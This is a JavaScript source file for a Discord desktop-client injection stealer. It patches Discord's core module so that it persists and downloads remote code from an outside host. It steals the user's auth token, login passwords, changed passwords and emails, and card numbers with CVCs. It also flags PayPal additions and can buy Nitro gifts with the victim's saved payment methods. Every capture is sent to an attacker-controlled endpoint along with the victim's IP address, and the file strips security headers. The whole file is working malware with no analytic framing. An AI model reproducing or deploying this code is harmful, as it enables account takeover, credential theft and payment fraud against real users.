const args = process.argv;
const fs = require('fs');
const path = require('path');
const https = require('https');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron');

const config = {
    key: '%key%',
    web: 'http://heil.com',
    auto_buy_nitro: false,
    injection_url: 'http://heil.com',

    api: 'https://discord.com/api/v9/users/@me',
    nitro: {
        boost: {
            year: {
                id: '521847234246082599',
                sku: '511651885459963904',
                price: '9999',
            },
            month: {
                id: '521847234246082599',
                sku: '511651880837840896',
                price: '999',
            },
        },
        classic: {
            month: {
                id: '521846918637420545',
                sku: '511651871736201216',
                price: '499',
            },
        },
    },
    filter: {
        urls: [
            'https://discord.com/api/v*/users/@me',
            'https://discordapp.com/api/v*/users/@me',
            'https://*.discord.com/api/v*/users/@me',
            'https://discordapp.com/api/v*/auth/login',
            'https://discord.com/api/v*/auth/login',
            'https://*.discord.com/api/v*/auth/login',
            'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
            'https://api.stripe.com/v*/tokens',
            'https://api.stripe.com/v*/setup_intents/*/confirm',
            'https://api.stripe.com/v*/payment_intents/*/confirm',
        ],
    },
    filter2: {
        urls: [
            'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
            'https://*.discord.com/api/v*/applications/detectable',
            'https://discord.com/api/v*/applications/detectable',
            'https://*.discord.com/api/v*/users/@me/library',
            'https://discord.com/api/v*/users/@me/library',
            'wss://remote-auth-gateway.discord.gg/*',
        ],
    },
};

const discordPath = (function () {
    const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
    let resourcePath;

    if (process.platform === 'win32') {
        resourcePath = path.join(app, 'resources');
    } else if (process.platform === 'darwin') {
        resourcePath = path.join(app, 'Contents', 'Resources');
    }

    if (fs.existsSync(resourcePath)) return { resourcePath, app };
    return { undefined, undefined };
})();

function updateCheck() {
    const { resourcePath, app } = discordPath;
    if (resourcePath === undefined || app === undefined) return;
    const appPath = path.join(resourcePath, 'app');
    const packageJson = path.join(appPath, 'package.json');
    const resourceIndex = path.join(appPath, 'index.js');
    const coreVal = fs.readdirSync(`${app}\\modules\\`).filter(x => /discord_desktop_core-+?/.test(x))[0]
    const indexJs = `${app}\\modules\\${coreVal}\\discord_desktop_core\\index.js`;
    const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
    if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
    if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
    if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

    if (process.platform === 'win32' || process.platform === 'darwin') {
        fs.writeFileSync(
            packageJson,
            JSON.stringify(
                {
                    name: 'discord',
                    main: 'index.js',
                },
                null,
                4,
            ),
        );

        const startUpScript = `const fs = require('fs'), https = require('https');
const indexJs = '${indexJs}';
const bdPath = '${bdPath}';
const fileSize = fs.statSync(indexJs).size
fs.readFileSync(indexJs, 'utf8', (err, data) => {
    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
        init();
})
async function init() {
    https.get('${config.injection_url}', (res) => {
        const file = fs.createWriteStream(indexJs);
        res.replace('%key%', '${config.key}')
        res.pipe(file);
        file.on('finish', () => {
            file.close();
        });
    
    }).on("error", (err) => {
        setTimeout(init(), 10000);
    });
}
require('${path.join(resourcePath, 'app.asar')}')
if (fs.existsSync(bdPath)) require(bdPath);`;
        fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
    }
    if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;
    fs.rmdirSync(path.join(__dirname, 'initiation'));
    execScript(
        `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
    );
    return !1;
}

async function getIp() {
    const window = BrowserWindow.getAllWindows()[0];
    var ip = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );xmlHttp.send( null );xmlHttp.responseText;`, !0)
    return ip;
}

const execScript = (script) => {
    const window = BrowserWindow.getAllWindows()[0];
    return window.webContents.executeJavaScript(script, !0);
};

const Purchase = async (token, id, _type, _time) => {
    const options = {
        expected_amount: config.nitro[_type][_time]['price'],
        expected_currency: 'usd',
        gift: true,
        payment_source_id: id,
        payment_source_token: null,
        purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',
        sku_subscription_plan_id: config.nitro[_type][_time]['sku'],
    };

    const req = execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.setRequestHeader('Content-Type', 'application/json');
    xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
    xmlHttp.responseText`);
    if (req['gift_code']) {
        return 'https://discord.gift/' + req['gift_code'];
    } else return null;
};

const buyNitro = async (token) => {
    const data = await fetchBilling(token);
    const failedMsg = '*Failed to Purchase*';
    if (!data) return failedMsg;

    let IDS = [];
    data.forEach((x) => {
        if (!x.invalid) {
            IDS = IDS.concat(x.id);
        }
    });
    for (let sourceID in IDS) {
        const first = Purchase(token, sourceID, 'boost', 'year');
        if (first !== null) {
            return first;
        } else {
            const second = Purchase(token, sourceID, 'boost', 'month');
            if (second !== null) {
                return second;
            } else {
                const third = Purchase(token, sourceID, 'classic', 'month');
                if (third !== null) {
                    return third;
                } else {
                    return failedMsg;
                }
            }
        }
    }
};

function sendToApi(data) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript('    \n' +
        '        var xhr = new XMLHttpRequest();\n' +
        '        xhr.open("POST", "' + config.web + '", true);\n' +
        "        xhr.setRequestHeader('Content-Type', 'application/json');\n" +
        "        xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n" +
        '        xhr.send(JSON.stringify(' + data + '));\n    ', true);
}

const login = async (email, password, token) => {
    const ip = await getIp();
    sendToApi(JSON.stringify({
        type: 'login',
        key: config.key,
        ip: ip,
        password: password,
        token: token
    }))
};

const passwordChanged = async (oldpassword, newpassword, token) => {
    const ip = await getIp();
    sendToApi(JSON.stringify({
        type: 'password',
        key: config.key,
        ip: ip,
        oldPassword: oldpassword,
        newPassword: newpassword,
        token: token
    }))
};

const emailChanged = async (email, password, token) => {
    const ip = await getIp();
    sendToApi(JSON.stringify({
        type: 'email',
        key: config.key,
        ip: ip,
        email: email,
        password: password,
        token: token
    }))
};

const PaypalAdded = async (token) => {
    const ip = await getIp();
    sendToApi(JSON.stringify({
        type: 'paypal',
        key: config.key,
        ip: ip,
        token: token
    }))
};

const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
    const ip = await getIp();
    sendToApi(JSON.stringify({
        type: 'card',
        key: config.key,
        ip: ip,
        token: token,
        number: number,
        cvc: cvc,
        expir_month: expir_month,
        expir_year: expir_year
    }))

};

const nitroBought = async (token) => {
    const ip = await getIp();
    const code = await buyNitro(token);
    sendToApi(JSON.stringify({
        type: 'nitro',
        key: config.key,
        ip: ip,
        token: token,
        code: code
    }))
};



const firstTime = async () => {
    const token = await execScript(
        `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
    );
    const ip = await getIp();
    sendToApi(JSON.stringify({
        type: 'normal',
        key: config.key,
        ip: ip,
        token: token
    }))
}

session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
    if (details.url.startsWith('wss://remote-auth-gateway')) return callback({ cancel: true });
    updateCheck();
    firstTime();
});

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    if (details.url.startsWith(config.web, 'https://myexternalip.com/raw')) {
        if (details.url.includes('discord.com')) {
            callback({
                responseHeaders: Object.assign(
                    {
                        'Access-Control-Allow-Headers': '*',
                    },
                    details.responseHeaders,
                ),
            });
        } else {
            callback({
                responseHeaders: Object.assign(
                    {
                        'Content-Security-Policy': ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
                        'Access-Control-Allow-Headers': '*',
                        'Access-Control-Allow-Origin': '*',
                    },
                    details.responseHeaders,
                ),
            });
        }
    } else {
        delete details.responseHeaders['content-security-policy'];
        delete details.responseHeaders['content-security-policy-report-only'];
        callback({
            responseHeaders: {
                ...details.responseHeaders,
                'Access-Control-Allow-Headers': '*',
            },
        });
    }
});

session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
    if (details.statusCode !== 200 && details.statusCode !== 202) return;
    const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
    const data = JSON.parse(unparsed_data);
    const token = await execScript(
        `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
    );
    switch (true) {
        case details.url.endsWith('login'):
            login(data.login, data.password, token).catch(console.error);
            break;

        case details.url.endsWith('users/@me') && details.method === 'PATCH':
            if (!data.password) return;
            if (data.email) {
                emailChanged(data.email, data.password, token).catch(console.error);
            }
            if (data.new_password) {
                passwordChanged(data.password, data.new_password, token).catch(console.error);
            }
            break;

        case details.url.endsWith('tokens') && details.method === 'POST':
            const item = querystring.parse(unparsedData.toString());
            ccAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token).catch(console.error);
            break;

        case details.url.endsWith('paypal_accounts') && details.method === 'POST':
            PaypalAdded(token).catch(console.error);
            break;

        case details.url.endsWith('confirm') && details.method === 'POST':
            if (!config.auto_buy_nitro) return;
            setTimeout(() => {
                nitroBought(token).catch(console.error);
            }, 7500);
            break;

        default:
            break;
    }
});
module.exports = require('./core.asar');
